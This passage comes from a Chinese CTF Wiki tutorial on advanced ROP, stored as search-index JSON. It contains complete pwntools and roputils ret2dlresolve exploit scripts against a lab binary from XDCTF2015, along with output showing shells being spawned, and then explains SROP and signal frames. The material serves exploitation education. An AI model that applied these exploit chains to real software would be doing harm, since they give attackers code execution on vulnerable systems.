### read 100 byte to base_stage rop . read ( 0 , base_stage , 100 ) ### stack pivoting, set esp = base_stage rop . migrate ( base_stage ) r . sendline ( rop . chain ()) ## write sh=\"/bin/sh\" rop = ROP ( './main' ) sh = \"/bin/sh\" plt0 = elf . get_section_by_name ( '.plt' ) . header . sh_addr rel_plt = elf . get_section_by_name ( '.rel.plt' ) . header . sh_addr dynsym = elf . get_section_by_name ( '.dynsym' ) . header . sh_addr dynstr = elf . get_section_by_name ( '.dynstr' ) . header . sh_addr ### making fake write symbol fake_sym_addr = base_stage + 32 align = 0x10 - (( fake_sym_addr - dynsym ) & 0xf ) # since the size of item(Elf32_Symbol) of dynsym is 0x10 fake_sym_addr = fake_sym_addr + align index_dynsym = ( fake_sym_addr - dynsym ) / 0x10 # calculate the dynsym index of write fake_write_sym = flat ([ 0x4c , 0 , 0 , 0x12 ]) ### making fake write relocation ## making base_stage+24 ---> fake reloc index_offset = base_stage + 24 - rel_plt write_got = elf . got [ 'write' ] r_info = ( index_dynsym << 8 ) | 0x7 fake_write_reloc = flat ([ write_got , r_info ]) rop . raw ( plt0 ) rop . raw ( index_offset ) ## fake ret addr of write rop . raw ( 'bbbb' ) rop . raw ( 1 ) rop . raw ( base_stage + 80 ) rop . raw ( len ( sh )) rop . raw ( fake_write_reloc ) # fake write reloc rop . raw ( 'a' * align ) # padding rop . raw ( fake_write_sym ) # fake write symbol rop . raw ( 'a' * ( 80 - len ( rop . chain ()))) rop . raw ( sh ) rop . raw ( 'a' * ( 100 - len ( rop . chain ()))) r . sendline ( rop . chain ()) r . interactive () \u5177\u4f53\u6548\u679c\u5982\u4e0b \u279c ret2dlresolve git: ( master ) \u2717 python stage4.py [ * ] '/mnt/hgfs/Hack/ctf/ctf-wiki/pwn/stackoverflow/example/ret2dlresolve/main' Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE ( 0x8048000 ) [ + ] Starting local process './main' : pid 128795 [ * ] Loaded cached gadgets for './main' [ * ] Switching to interactive mode /bin/sh [ * ] Got EOF while reading in interactive","title":"stage 4"},{"location":"pwn/stackoverflow/advanced_rop/#stage-5","text":"\u8fd9\u4e00\u9636\u6bb5\uff0c\u6211\u4eec\u5c06\u5728\u9636\u6bb54\u7684\u57fa\u7840\u4e0a\uff0c\u6211\u4eec\u8fdb\u4e00\u6b65\u4f7f\u5f97write\u7b26\u53f7\u7684st_name\u6307\u5411\u6211\u4eec\u81ea\u5df1\u6784\u9020\u7684\u5b57\u7b26\u4e32\u3002 from pwn import * elf = ELF ( 'main' ) r = process ( './main' ) rop = ROP ( './main' ) offset = 112 bss_addr = elf . bss () r . recvuntil ( 'Welcome to XDCTF2015~! \\n ' ) ## stack pivoting to bss segment ## new stack size is 0x800 stack_size = 0x800 base_stage = bss_addr + stack_size ### padding rop . raw ( 'a' * offset ) ### read 100 byte to base_stage rop . read ( 0 , base_stage , 100 ) ### stack pivoting, set esp = base_stage rop . migrate ( base_stage ) r . sendline ( rop . chain ()) ## write sh=\"/bin/sh\" rop = ROP ( './main' ) sh = \"/bin/sh\" plt0 = elf . get_section_by_name ( '.plt' ) . header . sh_addr rel_plt = elf . get_section_by_name ( '.rel.plt' ) . header . sh_addr dynsym = elf . get_section_by_name ( '.dynsym' ) . header . sh_addr dynstr = elf . get_section_by_name ( '.dynstr' ) . header . sh_addr ### making fake write symbol fake_sym_addr = base_stage + 32 align = 0x10 - (( fake_sym_addr - dynsym ) & 0xf ) # since the size of item(Elf32_Symbol) of dynsym is 0x10 fake_sym_addr = fake_sym_addr + align index_dynsym = ( fake_sym_addr - dynsym ) / 0x10 # calculate the dynsym index of write ## plus 10 since the size of Elf32_Sym is 16. st_name = fake_sym_addr + 0x10 - dynstr fake_write_sym = flat ([ st_name , 0 , 0 , 0x12 ]) ### making fake write relocation ## making base_stage+24 ---> fake reloc index_offset = base_stage + 24 - rel_plt write_got = elf . got [ 'write' ] r_info = ( index_dynsym << 8 ) | 0x7 fake_write_reloc = flat ([ write_got , r_info ]) rop . raw ( plt0 ) rop . raw ( index_offset ) ## fake ret addr of write rop . raw ( 'bbbb' ) rop . raw ( 1 ) rop . raw ( base_stage + 80 ) rop . raw ( len ( sh )) rop . raw ( fake_write_reloc ) # fake write reloc rop . raw ( 'a' * align ) # padding rop . raw ( fake_write_sym ) # fake write symbol rop . raw ( 'write \\x00 ' ) # there must be a \\x00 to mark the end of string rop . raw ( 'a' * ( 80 - len ( rop . chain ()))) rop . raw ( sh ) rop . raw ( 'a' * ( 100 - len ( rop . chain ()))) r . sendline ( rop . chain ()) r . interactive () \u6548\u679c\u5982\u4e0b \u279c ret2dlresolve git: ( master ) \u2717 python stage5.py [ * ] '/mnt/hgfs/Hack/ctf/ctf-wiki/pwn/stackoverflow/example/ret2dlresolve/main' Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE ( 0x8048000 ) [ + ] Starting local process './main' : pid 129249 [ * ] Loaded cached gadgets for './main' [ * ] Switching to interactive mode /bin/sh [ * ] Got EOF while reading in interactive","title":"stage 5"},{"location":"pwn/stackoverflow/advanced_rop/#stage-6","text":"\u8fd9\u4e00\u9636\u6bb5\uff0c\u6211\u4eec\u53ea\u9700\u8981\u5c06\u539f\u5148\u7684write\u5b57\u7b26\u4e32\u4fee\u6539\u4e3asystem\u5b57\u7b26\u4e32\uff0c\u540c\u65f6\u4fee\u6539write\u7684\u53c2\u6570\u4e3asystem\u7684\u53c2\u6570\u5373\u53ef\u83b7\u53d6shell\u3002\u8fd9\u662f\u56e0\u4e3a\uff0cdl_resolve\u6700\u7ec8\u4f9d\u8d56\u7684\u662f\u6211\u4eec\u6240\u7ed9\u5b9a\u7684\u5b57\u7b26\u4e32\uff0c\u5373\u4f7f\u6211\u4eec\u7ed9\u4e86\u4e00\u4e2a\u5047\u7684\u5b57\u7b26\u4e32\u5b83\u4ecd\u7136\u4f1a\u53bb\u89e3\u6790\u5e76\u6267\u884c\u3002\u5177\u4f53\u4ee3\u7801\u5982\u4e0b from pwn import * elf = ELF ( 'main' ) r = process ( './main' ) rop = ROP ( './main' ) offset = 112 bss_addr = elf . bss () r . recvuntil ( 'Welcome to XDCTF2015~! \\n ' ) ## stack pivoting to bss segment ## new stack size is 0x800 stack_size = 0x800 base_stage = bss_addr + stack_size ### padding rop . raw ( 'a' * offset ) ### read 100 byte to base_stage rop . read ( 0 , base_stage , 100 ) ### stack pivoting, set esp = base_stage rop . migrate ( base_stage ) r . sendline ( rop . chain ()) ## write sh=\"/bin/sh\" rop = ROP ( './main' ) sh = \"/bin/sh\" plt0 = elf . get_section_by_name ( '.plt' ) . header . sh_addr rel_plt = elf . get_section_by_name ( '.rel.plt' ) . header . sh_addr dynsym = elf . get_section_by_name ( '.dynsym' ) . header . sh_addr dynstr = elf . get_section_by_name ( '.dynstr' ) . header . sh_addr ### making fake write symbol fake_sym_addr = base_stage + 32 align = 0x10 - (( fake_sym_addr - dynsym ) & 0xf ) # since the size of item(Elf32_Symbol) of dynsym is 0x10 fake_sym_addr = fake_sym_addr + align index_dynsym = ( fake_sym_addr - dynsym ) / 0x10 # calculate the dynsym index of write ## plus 10 since the size of Elf32_Sym is 16. st_name = fake_sym_addr + 0x10 - dynstr fake_write_sym = flat ([ st_name , 0 , 0 , 0x12 ]) ### making fake write relocation ## making base_stage+24 ---> fake reloc index_offset = base_stage + 24 - rel_plt write_got = elf . got [ 'write' ] r_info = ( index_dynsym << 8 ) | 0x7 fake_write_reloc = flat ([ write_got , r_info ]) rop . raw ( plt0 ) rop . raw ( index_offset ) ## fake ret addr of write rop . raw ( 'bbbb' ) rop . raw ( base_stage + 82 ) rop . raw ( 'bbbb' ) rop . raw ( 'bbbb' ) rop . raw ( fake_write_reloc ) # fake write reloc rop . raw ( 'a' * align ) # padding rop . raw ( fake_write_sym ) # fake write symbol rop . raw ( 'system \\x00 ' ) # there must be a \\x00 to mark the end of string rop . raw ( 'a' * ( 80 - len ( rop . chain ()))) print rop . dump () print len ( rop . chain ()) rop . raw ( sh + ' \\x00 ' ) rop . raw ( 'a' * ( 100 - len ( rop . chain ()))) r . sendline ( rop . chain ()) r . interactive () \u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u8fd9\u91cc\u6211'/bin/sh'\u7684\u504f\u79fb\u6211\u4fee\u6539\u4e3a\u4e8682\uff0c\u8fd9\u662f\u56e0\u4e3apwntools\u4e2d\u5b83\u4f1a\u81ea\u52a8\u5e2e\u4f60\u5bf9\u9f50\u5b57\u7b26\u4e32\u3002\u3002\u3002\u4e0b\u9762\u8fd9\u4e00\u884c\u8bf4\u660e\u4e86\u95ee\u9898\u3002 0x0050: 'aara' \u6548\u679c\u5982\u4e0b \u279c ret2dlresolve git: ( master ) \u2717 python stage6.py [ * ] '/mnt/hgfs/Hack/ctf/ctf-wiki/pwn/stackoverflow/example/ret2dlresolve/main' Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE ( 0x8048000 ) [ + ] Starting local process './main' : pid 130415 [ * ] Loaded cached gadgets for './main' 0x0000: 0x8048380 0x0004: 0x2528 0x0008: 'bbbb' 'bbbb' 0x000c: 0x804a892 0x0010: 'bbbb' 'bbbb' 0x0014: 'bbbb' 'bbbb' 0x0018: '\\x1c\\xa0\\x04\\x08' '\\x1c\\xa0\\x04\\x08\\x07i\\x02\\x00' 0x001c: '\\x07i\\x02\\x00' 0x0020: 'aaaa' 'aaaaaaaa' 0x0024: 'aaaa' 0x0028: '\\x00&\\x00\\x00' '\\x00&\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x12\\x00\\x00\\x00' 0x002c: '\\x00\\x00\\x00\\x00' 0x0030: '\\x00\\x00\\x00\\x00' 0x0034: '\\x12\\x00\\x00\\x00' 0x0038: 'syst' 'system\\x00' 0x003c: 'em\\x00o' 0x0040: 'aa' 0x0044: 'aaaa' 'aaaaaaaaaaaaaa' 0x0048: 'aaaa' 0x004c: 'aaaa' 0x0050: 'aara' 82 [ * ] Switching to interactive mode /bin/sh: 1 : xa: not found $ ls core main.c stage2.py stage4.py stage6.py main stage1.py stage3.py stage5.py","title":"stage 6"},{"location":"pwn/stackoverflow/advanced_rop/#_5","text":"\u6839\u636e\u4e0a\u9762\u7684\u4ecb\u7ecd\uff0c\u6211\u4eec\u5e94\u8be5\u5f88\u5bb9\u6613\u53ef\u4ee5\u7406\u89e3\u8fd9\u4e2a\u653b\u51fb\u4e86\u3002\u4e0b\u9762\u6211\u4eec\u76f4\u63a5\u4f7f\u7528roputil\u6765\u8fdb\u884c\u653b\u51fb\u3002\u4ee3\u7801\u5982\u4e0b from roputils import * from pwn import process from pwn import gdb from pwn import context r = process ( './main' ) context . log_level = 'debug' r . recv () rop = ROP ( './main' ) offset = 112 bss_base = rop . section ( '.bss' ) buf = rop . fill ( offset ) buf += rop . call ( 'read' , 0 , bss_base , 100 ) ## used to call dl_Resolve() buf += rop . dl_resolve_call ( bss_base + 20 , bss_base ) r . send ( buf ) buf = rop . string ( '/bin/sh' ) buf += rop . fill ( 20 , buf ) ## used to make faking data, such relocation, Symbol, Str buf += rop . dl_resolve_data ( bss_base + 20 , 'system' ) buf += rop . fill ( 100 , buf ) r . send ( buf ) r . interactive () \u5173\u4e8edl_resolve_call\u4e0edl_resolve_data\u7684\u5177\u4f53\u7ec6\u8282\u8bf7\u53c2\u8003roputils.py\u7684\u6e90\u7801\uff0c\u6bd4\u8f83\u5bb9\u6613\u7406\u89e3\uff0c\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0cdl_resolve\u6267\u884c\u5b8c\u4e4b\u540e\u4e5f\u662f\u9700\u8981\u6709\u5bf9\u5e94\u7684\u8fd4\u56de\u5730\u5740\u7684\u3002 \u6548\u679c\u5982\u4e0b \u279c ret2dlresolve git: ( master ) \u2717 python roptool.py [ + ] Starting local process './main' : pid 6114 [ DEBUG ] Received 0x17 bytes: 'Welcome to XDCTF2015~!\\n' [ DEBUG ] Sent 0x94 bytes: 00000000 46 4c 68 78 52 36 67 6e 65 47 53 58 71 77 51 49 \u2502FLhx\u2502R6gn\u2502eGSX\u2502qwQI\u2502 00000010 32 43 6c 49 77 76 51 33 47 49 4a 59 50 74 6c 38 \u25022ClI\u2502wvQ3\u2502GIJY\u2502Ptl8\u2502 00000020 57 54 68 4a 63 48 39 62 46 55 52 58 50 73 38 64 \u2502WThJ\u2502cH9b\u2502FURX\u2502Ps8d\u2502 00000030 72 4c 38 63 50 79 37 73 55 45 7a 32 6f 59 5a 42 \u2502rL8c\u2502Py7s\u2502UEz2\u2502oYZB\u2502 00000040 76 59 32 43 74 75 77 6f 70 56 61 44 6a 73 35 6b \u2502vY2C\u2502tuwo\u2502pVaD\u2502js5k\u2502 00000050 41 77 78 77 49 72 7a 49 70 4d 31 67 52 6f 44 6f \u2502Awxw\u2502IrzI\u2502pM1g\u2502RoDo\u2502 00000060 43 44 43 6e 45 31 50 48 53 73 64 30 6d 54 7a 5a \u2502CDCn\u2502E1PH\u2502Ssd0\u2502mTzZ\u2502 00000070 a0 83 04 08 19 86 04 08 00 00 00 00 40 a0 04 08 \u2502\u00b7\u00b7\u00b7\u00b7\u2502\u00b7\u00b7\u00b7\u00b7\u2502\u00b7\u00b7\u00b7\u00b7\u2502@\u00b7\u00b7\u00b7\u2502 00000080 64 00 00 00 80 83 04 08 28 1d 00 00 79 83 04 08 \u2502d\u00b7\u00b7\u00b7\u2502\u00b7\u00b7\u00b7\u00b7\u2502 ( \u00b7\u00b7\u00b7\u2502y\u00b7\u00b7\u00b7\u2502 00000090 40 a0 04 08 \u2502@\u00b7\u00b7\u00b7\u2502\u2502 00000094 [ DEBUG ] Sent 0x64 bytes: 00000000 2f 62 69 6e 2f 73 68 00 73 52 46 66 57 43 59 52 \u2502/bin\u2502/sh\u00b7\u2502sRFf\u2502WCYR\u2502 00000010 66 4c 35 52 78 49 4c 53 54 a0 04 08 07 e9 01 00 \u2502fL5R\u2502xILS\u2502T\u00b7\u00b7\u00b7\u2502\u00b7\u00b7\u00b7\u00b7\u2502 00000020 6e 6b 45 32 52 76 73 6c 00 1e 00 00 00 00 00 00 \u2502nkE2\u2502Rvsl\u2502\u00b7\u00b7\u00b7\u00b7\u2502\u00b7\u00b7\u00b7\u00b7\u2502 00000030 00 00 00 00 12 00 00 00 73 79 73 74 65 6d 00 74 \u2502\u00b7\u00b7\u00b7\u00b7\u2502\u00b7\u00b7\u00b7\u00b7\u2502syst\u2502em\u00b7t\u2502 00000040 5a 4f 4e 6c 6c 73 4b 5a 76 53 48 6e 38 37 49 47 \u2502ZONl\u2502lsKZ\u2502vSHn\u250287IG\u2502 00000050 69 49 52 6c 50 44 38 67 45 77 75 6c 72 47 6f 67 \u2502iIRl\u2502PD8g\u2502Ewul\u2502rGog\u2502 00000060 55 41 52 4f \u2502UARO\u2502\u2502 00000064 [ * ] Switching to interactive mode $ ls [ DEBUG ] Sent 0x3 bytes: 'ls\\n' [ DEBUG ] Received 0x8d bytes: 'core\\t main roptool.py roputils.pyc\\tstage2.py stage4.py stage6.py\\n' '__init__.py main.c roputils.py stage1.py\\tstage3.py stage5.py\\n' core main roptool.py roputils.pyc stage2.py stage4.py stage6.py __init__.py main.c roputils.py stage1.py stage3.py stage5.py","title":"\u5de5\u5177\u653b\u51fb"},{"location":"pwn/stackoverflow/advanced_rop/#_6","text":"","title":"\u9898\u76ee"},{"location":"pwn/stackoverflow/advanced_rop/#srop","text":"","title":"SROP"},{"location":"pwn/stackoverflow/advanced_rop/#_7","text":"SROP(Sigreturn Oriented Programming)\u4e8e2014\u5e74\u88abVrije Universiteit Amsterdam\u7684Erik Bosman\u63d0\u51fa\uff0c\u5176\u76f8\u5173\u7814\u7a76 Framing Signals \u2014 A Return to Portable Shellcode \u53d1\u8868\u5728\u5b89\u5168\u9876\u7ea7\u4f1a\u8bae Oakland 2014 \u4e0a\uff0c\u88ab\u8bc4\u9009\u4e3a\u5f53\u5e74\u7684 Best Student Papers \u3002\u5176\u4e2d\u76f8\u5173\u7684paper\u4ee5\u53caslides\u7684\u94fe\u63a5\u5982\u4e0b\uff1a paper slides \u5176\u4e2d\uff0c sigreturn \u662f\u4e00\u4e2a\u7cfb\u7edf\u8c03\u7528\uff0c\u5728\u7c7bunix\u7cfb\u7edf\u53d1\u751fsignal\u7684\u65f6\u5019\u4f1a\u88ab\u95f4\u63a5\u5730\u8c03\u7528\u3002","title":"\u57fa\u672c\u4ecb\u7ecd"},{"location":"pwn/stackoverflow/advanced_rop/#signal","text":"signal\u673a\u5236\u662f\u7c7bunix\u7cfb\u7edf\u4e2d\u8fdb\u7a0b\u4e4b\u95f4\u76f8\u4e92\u4f20\u9012\u4fe1\u606f\u7684\u4e00\u79cd\u65b9\u6cd5\u3002\u4e00\u822c\uff0c\u6211\u4eec\u4e5f\u79f0\u5176\u4e3a\u8f6f\u4e2d\u65ad\u4fe1\u53f7\uff0c\u6216\u8005\u8f6f\u4e2d\u65ad\u3002\u6bd4\u5982\u8bf4\uff0c\u8fdb\u7a0b\u4e4b\u95f4\u53ef\u4ee5\u901a\u8fc7\u7cfb\u7edf\u8c03\u7528kill\u6765\u53d1\u9001\u8f6f\u4e2d\u65ad\u4fe1\u53f7\u3002\u4e00\u822c\u6765\u8bf4\uff0c\u4fe1\u53f7\u673a\u5236\u5e38\u89c1\u7684\u6b65\u9aa4\u5982\u4e0b\u56fe\u6240\u793a\uff1a \u5185\u6838\u5411\u67d0\u4e2a\u8fdb\u7a0b\u53d1\u9001signal\u673a\u5236\uff0c\u8be5\u8fdb\u7a0b\u4f1a\u88ab\u6682\u65f6\u6302\u8d77\uff0c\u8fdb\u5165\u5185\u6838\u6001\u3002 \u5185\u6838\u4f1a\u4e3a\u8be5\u8fdb\u7a0b\u4fdd\u5b58\u76f8\u5e94\u7684\u4e0a\u4e0b\u6587\uff0c \u4e3b\u8981\u662f\u5c06\u6240\u6709\u5bc4\u5b58\u5668\u538b\u5165\u6808\u4e2d\uff0c\u4ee5\u53ca\u538b\u5165signal\u4fe1\u606f\uff0c\u4ee5\u53ca\u6307\u5411sigreturn\u7684\u7cfb\u7edf\u8c03\u7528\u5730\u5740 \u3002\u6b64\u65f6\u6808\u7684\u7ed3\u6784\u5982\u4e0b\u56fe\u6240\u793a\uff0c\u6211\u4eec\u79f0ucontext\u4ee5\u53casiginfo\u8fd9\u4e00\u6bb5\u4e3aSignal Frame\u3002 \u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u8fd9\u4e00\u90e8\u5206\u662f\u5728\u7528\u6237\u8fdb\u7a0b\u7684\u5730\u5740\u7a7a\u95f4\u7684\u3002 \u4e4b\u540e\u4f1a\u8df3\u8f6c\u5230\u6ce8\u518c\u8fc7\u7684signal handler\u4e2d\u5904\u7406\u76f8\u5e94\u7684signal\u3002\u56e0\u6b64\uff0c\u5f53signal handler\u6267\u884c\u5b8c\u4e4b\u540e\uff0c\u5c31\u4f1a\u6267\u884csigreturn\u4ee3\u7801\u3002 \u5bf9\u4e8esignal Frame\u6765\u8bf4\uff0c\u4e0d\u540c\u4f1a\u56e0\u4e3a\u67b6\u6784\u7684\u4e0d\u540c\u800c\u56e0\u6b64\u6709\u6240\u533a\u522b\uff0c\u8fd9\u91cc\u7ed9\u51fa\u5206\u522b\u7ed9\u51fax86\u4ee5\u53cax64\u7684sigcontext x86 struct sigcontext { unsigned short gs , __gsh ; unsigned short fs , __fsh ; unsigned short es , __esh ; unsigned short ds , __dsh ; unsigned long edi ; unsigned long esi ; unsigned long ebp ; unsigned long esp ; unsigned long ebx ; unsigned long edx ; unsigned long ecx ; unsigned long eax ; unsigned long trapno ; unsigned long err ; unsigned long eip ; unsigned short cs , __csh ; unsigned long eflags ; unsigned long esp_at_signal ; unsigned short ss , __ssh ; struct _fpstate * fpstate ; unsigned long oldmask ; unsigned long cr2 ; }; x64 struct _fpstate { /* FPU environment matching the 64-bit FXSAVE layout. */ __uint16_t cwd ; __uint16_t swd ; __uint16_t ftw ; __uint16_t fop ; __uint64_t rip ; __uint64_t rdp ; __uint32_t mxcsr ; __uint32_t mxcr_mask ; struct _fpxreg _st [ 8 ]; struct _xmmreg _xmm [ 16 ]; __uint32_t padding [ 24 ]; }; struct sigcontext { __uint64_t r8 ; __uint64_t r9 ; __uint64_t r10 ; __uint64_t r11 ; __uint64_t r12 ; __uint64_t r13 ; __uint64_t r14 ; __uint64_t r15 ; __uint64_t rdi ; __uint64_t rsi ; __uint64_t rbp ; __uint64_t rbx ; __uint64_t rdx ; __uint64_t rax ; __uint64_t rcx ; __uint64_t rsp ; __uint64_t rip ; __uint64_t eflags ; unsigned short cs ; unsigned short gs ; unsigned short fs ; unsigned short __pad0 ; __uint64_t err ; __uint64_t trapno ; __uint64_t oldmask ; __uint64_t cr2 ; __extension__ union { struct _fpstate * fpstate ; __uint64_t __fpstate_word ; }; __uint64_t __reserved1 [ 8 ]; }; signal handler\u8fd4\u56de\u540e\uff0c\u5185\u6838\u4e3a\u6267\u884csigreturn\u7cfb\u7edf\u8c03\u7528\uff0c\u4e3a\u8be5\u8fdb\u7a0b\u6062\u590d\u4e4b\u524d\u4fdd\u5b58\u7684\u4e0a\u4e0b\u6587\uff0c\u5176\u4e2d\u5305\u62ec\u5c06\u6240\u6709\u538b\u5165\u7684\u5bc4\u5b58\u5668\uff0c\u91cd\u65b0pop\u56de\u5bf9\u5e94\u7684\u5bc4\u5b58\u5668\uff0c\u6700\u540e\u6062\u590d\u8fdb\u7a0b\u7684\u6267\u884c\u3002\u5176\u4e2d\uff0c32\u4f4d\u7684sigreturn\u7684\u8c03\u7528\u53f7\u4e3a77\uff0c64\u4f4d\u7684\u7cfb\u7edf\u8c03\u7528\u53f7\u4e3a15\u3002","title":"signal\u673a\u5236"},{"location":"pwn/stackoverflow/advanced_rop/#_8","text":"\u4ed4\u7ec6\u56de\u987e\u4e00\u4e0b\u5185\u6838\u5728signal\u4fe1\u53f7\u5904\u7406\u7684\u8fc7\u7a0b\u4e2d\u7684\u5de5\u4f5c\uff0c\u6211\u4eec\u53ef\u4ee5\u53d1\u73b0\uff0c\u5185\u6838\u4e3b\u8981\u505a\u7684\u5de5\u4f5c\u5c31\u662f\u4e3a\u8fdb\u7a0b\u4fdd\u5b58\u4e0a\u4e0b\u6587\uff0c\u5e76\u4e14\u6062\u590d\u4e0a\u4e0b\u6587\u3002\u8fd9\u4e2a\u4e3b\u8981\u7684\u53d8\u52a8\u90fd\u5728Signal Frame\u4e2d\u3002\u4f46\u662f\u9700\u8981\u6ce8\u610f\u7684\u662f\uff1a Signal Frame\u88ab\u4fdd\u5b58\u5728\u7528\u6237\u7684\u5730\u5740\u7a7a\u95f4\u4e2d\uff0c\u6240\u4ee5\u7528\u6237\u662f\u53ef\u4ee5\u8bfb\u5199\u7684\u3002 \u7531\u4e8e\u5185\u6838\u4e0e\u4fe1\u53f7\u5904\u7406\u7a0b\u5e8f\u65e0\u5173(kernel agnostic about signal handlers)\uff0c\u5b83\u5e76\u4e0d\u4f1a\u53bb\u8bb0\u5f55\u8fd9\u4e2asignal\u5bf9\u5e94\u7684Signal Frame\uff0c\u6240\u4ee5\u5f53\u6267\u884csigreturn\u7cfb\u7edf\u8c03\u7528\u65f6\uff0c\u6b64\u65f6\u7684Signal Frame\u5e76\u4e0d\u4e00\u5b9a\u662f\u4e4b\u524d\u5185\u6838\u4e3a\u7528\u6237\u8fdb\u7a0b\u4fdd\u5b58\u7684Signal Frame\u3002 \u8bf4\u5230\u8fd9\u91cc\uff0c\u5176\u5b9e\uff0cSROP\u7684\u57fa\u672c\u5229\u7528\u539f\u7406\u4e5f\u5c31\u51fa\u73b0\u4e86\u3002\u4e0b\u9762\u4e3e\u4e24\u4e2a\u7b80\u5355\u7684\u4f8b\u5b50\u3002","title":"\u653b\u51fb\u539f\u7406"},{"location":"pwn/stackoverflow/advanced_rop/#shell","text":"\u9996\u5148\uff0c\u6211\u4eec\u5047\u8bbe\u653b\u51fb\u8005\u53ef\u4ee5\u63a7\u5236\u7528\u6237\u8fdb\u7a0b\u7684\u6808\uff0c\u90a3\u4e48\u5b83\u5c31\u53ef\u4ee5\u4f2a\u9020\u4e00\u4e2aSignal Frame\uff0c\u5982\u4e0b\u56fe\u6240\u793a\uff0c\u8fd9\u91cc\u4ee564\u4f4d\u4e3a\u4f8b\u5b50\uff0c\u7ed9\u51faSignal Frame\u66f4\u52a0\u8be6\u7ec6\u7684\u4fe1\u606f \u5f53\u7cfb\u7edf\u6267\u884c\u5b8csigreturn\u7cfb\u7edf\u8c03\u7528\u4e4b\u540e\uff0c\u4f1a\u6267\u884c\u4e00\u7cfb\u5217\u7684pop\u6307\u4ee4\u4ee5\u4fbf\u4e8e\u6062\u590d\u76f8\u5e94\u5bc4\u5b58\u5668\u7684\u503c\uff0c\u5f53\u6267\u884c\u5230rip\u65f6\uff0c\u5c31\u4f1a\u5c06\u7a0b\u5e8f\u6267\u884c\u6d41\u6307\u5411syscall\u5730\u5740\uff0c\u6839\u636e\u76f8\u5e94\u5bc4\u5b58\u5668\u7684\u503c\uff0c\u6b64\u65f6\uff0c\u4fbf\u4f1a\u5f97\u5230\u4e00\u4e2ashell\u3002","title":"\u83b7\u53d6shell"},{"location":"pwn/stackoverflow/advanced_rop/#system-call-chains","text":"\u9700\u8981\u6307\u51fa\u7684\u662f\uff0c\u4e0a\u9762\u7684\u4f8b\u5b50\u4e2d\uff0c\u6211\u4eec\u53ea\u662f\u5355\u72ec\u7684\u83b7\u5f97\u4e00\u4e2ashell\u3002\u6709\u65f6\u5019\uff0c\u6211\u4eec\u53ef\u80fd\u4f1a\u5e0c\u671b\u6267\u884c\u4e00\u7cfb\u5217\u7684\u51fd\u6570\u3002\u6211\u4eec\u53ea\u9700\u8981\u505a\u4e24\u5904\u4fee\u6539\u5373\u53ef \u63a7\u5236\u6808\u6307\u9488\u3002 \u628a\u539f\u6765rip\u6307\u5411\u7684 syscall gadget\u6362\u6210 syscall; ret gadget\u3002 \u5982\u4e0b\u56fe\u6240\u793a \uff0c\u8fd9\u6837\u5f53\u6bcf\u6b21syscall\u8fd4\u56de\u7684\u65f6\u5019\uff0c\u6808\u6307\u9488\u90fd\u4f1a\u6307\u5411\u4e0b\u4e00\u4e2aSignal Frame\u3002\u56e0\u6b64\u5c31\u53ef\u4ee5\u6267\u884c\u4e00\u7cfb\u5217\u7684sigreturn\u51fd\u6570\u8c03\u7528\u3002","title":"system call chains"},{"location":"pwn/stackoverflow/advanced_rop/#_9","text":"\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u6211\u4eec\u5728\u6784\u9020ROP\u653b\u51fb\u7684\u65f6\u5019\uff0c\u9700\u8981\u6ee1\u8db3\u4e0b\u9762\u7684\u6761\u4ef6 \u53ef\u4ee5\u901a\u8fc7\u6808\u6ea2\u51fa\u6765\u63a7\u5236\u6808\u7684\u5185\u5bb9 \u9700\u8981\u77e5\u9053\u76f8\u5e94\u7684\u5730\u5740 \"/bin/sh\" Signal Frame syscal sigreturn \u9700\u8981\u6709\u591f\u5927\u7684\u7a7a\u95f4\u6765\u585e\u4e0b\u6574\u4e2asigal frame \u6b64\u5916\uff0c\u5173\u4e8esigreturn\u4ee5\u53casyscall;ret\u8fd9\u4e24\u4e2agadget\u5728\u4e0a\u9762\u5e76\u6ca1\u6709\u63d0\u53ca\u3002\u63d0\u51fa\u8be5\u653b\u51fb\u7684\u8bba\u6587\u4f5c\u8005\u53d1\u73b0\u4e86\u8fd9\u4e9bgadgets\u51fa\u73b0\u7684\u67d0\u4e9b\u5730\u5740\uff1a \u5e76\u4e14\uff0c\u4f5c\u8005\u53d1\u73b0\uff0c\u6709\u4e9b\u7cfb\u7edf\u4e0aSROP\u7684\u5730\u5740\u88ab\u968f\u673a\u5316\u4e86\uff0c\u800c\u6709\u4e9b\u5219\u6ca1\u6709\u3002\u6bd4\u5982\u8bf4 Linux < 3.3 x86_64 \uff08\u5728Debian 7.0\uff0c Ubuntu Long Term Support\uff0c CentOS 6\u7cfb\u7edf\u4e2d\u9ed8\u8ba4\u5185\u6838\uff09\uff0c\u53ef\u4ee5\u76f4\u63a5\u5728vsyscall\u4e2d\u7684\u56fa\u5b9a\u5730\u5740\u5904\u627e\u5230syscall&return\u4ee3\u7801\u7247\u6bb5\u3002\u5982\u4e0b \u4f46\u662f\u76ee\u524d\u5b83\u5df2\u7ecf\u88ab vsyscall-emulate \u548c vdso \u673a\u5236\u4ee3\u66ff\u4e86\u3002\u6b64\u5916\uff0c\u76ee\u524d\u5927\u591a\u6570\u7cfb\u7edf\u90fd\u4f1a\u5f00\u542fASLR\u4fdd\u62a4\uff0c\u6240\u4ee5\u76f8\u5bf9\u6765\u8bf4\u8fd9\u4e9bgadgets\u90fd\u5e76\u4e0d\u5bb9\u6613\u627e\u5230\u3002 